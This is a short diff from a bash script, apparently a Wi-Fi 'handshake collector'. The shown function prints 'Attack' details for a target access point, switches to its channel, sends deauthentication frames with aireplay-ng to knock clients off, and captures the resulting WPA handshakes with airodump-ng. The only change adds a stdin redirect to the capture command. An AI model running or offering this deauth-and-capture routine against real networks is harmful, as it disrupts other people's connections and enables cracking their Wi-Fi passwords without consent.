@@ -118,7 +118,7 @@ active() {
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
           iwconfig $interface channel $Channel
           aireplay-ng -a $BSSID -0 10 $interface &
-          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface >/dev/null 2>&1 &
+          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface >/dev/null 2>&1 </dev/null &
           airodumpPID=`echo $!`
           sleep 30
           echo "airodumpPID:"$airodumpPID
